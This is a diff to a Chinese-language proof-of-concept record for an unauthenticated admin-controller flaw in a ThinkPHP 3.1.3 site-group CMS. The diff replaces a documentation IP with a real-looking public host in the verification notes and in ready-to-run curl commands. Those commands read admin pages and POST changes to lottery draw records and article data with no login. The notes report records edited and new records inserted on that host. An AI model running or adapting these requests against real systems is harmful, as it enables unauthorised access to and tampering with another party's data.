@@ -7,11 +7,11 @@
 - **severity**: critical
 - **source**: self
 - **verified**: 1
-- **verified_note**: 2026-10-29 在 192.0.2.2:443 零 Cookie、curl -k --noproxy '*' 直连实测：① GET /index.php?g=Admin&m=Autoart&a=kjer → 200/88964B「开奖管理」，101 行记录（ID 6070~6101、期号 2026291~2026301）；对照同组 User/Main/System/Admin/Article/Payorder/Block/Daikuan → 全部 302 Location: /index.php?g=Admin&m=Index&a=login；② GET a=indexam → 200/64084B 帖子管理（含文章 ID/作者/单价/销量）、a=catlist → 200/42306B；③ POST a=editkjer&id=6101 把 topenCode 07→44 回显「编辑成功!」，回读 kjer 该行变 44，再改回 07；④ POST a=editkjer&id=0 新插记录，列表「共 N 条记录」224→225→226；⑤ POST a=article_save ids=8_54 → 200/1B body "1"；⑥ 根因：GET /App/Lib/Action/Admin/AutoartAction.class.php/ → Fatal error 回显 /www/wwwroot/kkjjer_com/App/Lib/Action/Admin/AutoartAction.class.php（extends Action，不走 CommonAction::_initialize 的 Host/登录闸门）。
+- **verified_note**: 2026-10-29 在 45.151.135.166:443 零 Cookie、curl -k --noproxy '*' 直连实测：① GET /index.php?g=Admin&m=Autoart&a=kjer → 200/88964B「开奖管理」，101 行记录（ID 6070~6101、期号 2026291~2026301）；对照同组 User/Main/System/Admin/Article/Payorder/Block/Daikuan → 全部 302 Location: /index.php?g=Admin&m=Index&a=login；② GET a=indexam → 200/64084B 帖子管理（含文章 ID/作者/单价/销量）、a=catlist → 200/42306B；③ POST a=editkjer&id=6101 把 topenCode 07→44 回显「编辑成功!」，回读 kjer 该行变 44，再改回 07；④ POST a=editkjer&id=0 新插记录，列表「共 N 条记录」224→225→226；⑤ POST a=article_save ids=8_54 → 200/1B body "1"；⑥ 根因：GET /App/Lib/Action/Admin/AutoartAction.class.php/ → Fatal error 回显 /www/wwwroot/kkjjer_com/App/Lib/Action/Admin/AutoartAction.class.php（extends Action，不走 CommonAction::_initialize 的 Host/登录闸门）。
 - **path**: pocs/somcns-thinkphp3.1.3-站群-166-站-admin-autoart-控制器脱队-extends-ac/poc.txt
 - **tags**: thinkphp3.1.3,站群,somcns,autoart,extends-action,未授权访问,未授权写库,kjer
 - **created_at**: 2026-10-28T18:59:19.556Z
-- **engine**: 192.0.2.2 (https://192.0.2.2，docroot=/www/wwwroot/kkjjer_com)
+- **engine**: 45.151.135.166 (https://45.151.135.166，docroot=/www/wwwroot/kkjjer_com)
 
 ## 描述
 
@@ -46,8 +46,8 @@ curl -k --noproxy '*' -X POST "https://TARGET/index.php?g=Admin&m=Autoart&a=edit
 `/App/Lib/Action/Admin/AutoartAction.class.php` 里 `class AutoartAction extends Action`，未继承 `CommonAction`，因此 `CommonAction::_initialize()` 的登录/Host 白名单校验整段被跳过。同站 Wechat 控制器同型。
 
 ## 复现三件套
-1. `curl -k --noproxy '*' "https://192.0.2.2/index.php?g=Admin&m=Autoart&a=kjer"` → 200/88964B，`<title>开奖管理 - 管理系统</title>`
-2. `curl -k --noproxy '*' -X POST "https://192.0.2.2/index.php?g=Admin&m=Autoart&a=editkjer&id=6101" -d "expect=9996048&openTime=2026-10-29 02:30:00&type=8&openCode=01,02,03,04,05,06,07&zodiac=马&wave=red&topenCode=44&tzodiac=马&twave=red"` → 200「编辑成功!」，回读 topenCode=44
+1. `curl -k --noproxy '*' "https://45.151.135.166/index.php?g=Admin&m=Autoart&a=kjer"` → 200/88964B，`<title>开奖管理 - 管理系统</title>`
+2. `curl -k --noproxy '*' -X POST "https://45.151.135.166/index.php?g=Admin&m=Autoart&a=editkjer&id=6101" -d "expect=9996048&openTime=2026-10-29 02:30:00&type=8&openCode=01,02,03,04,05,06,07&zodiac=马&wave=red&topenCode=44&tzodiac=马&twave=red"` → 200「编辑成功!」，回读 topenCode=44
 3. 复原：同请求 `topenCode=07`，读回 07（零副作用验证/回滚）
 
 ## 证伪条件
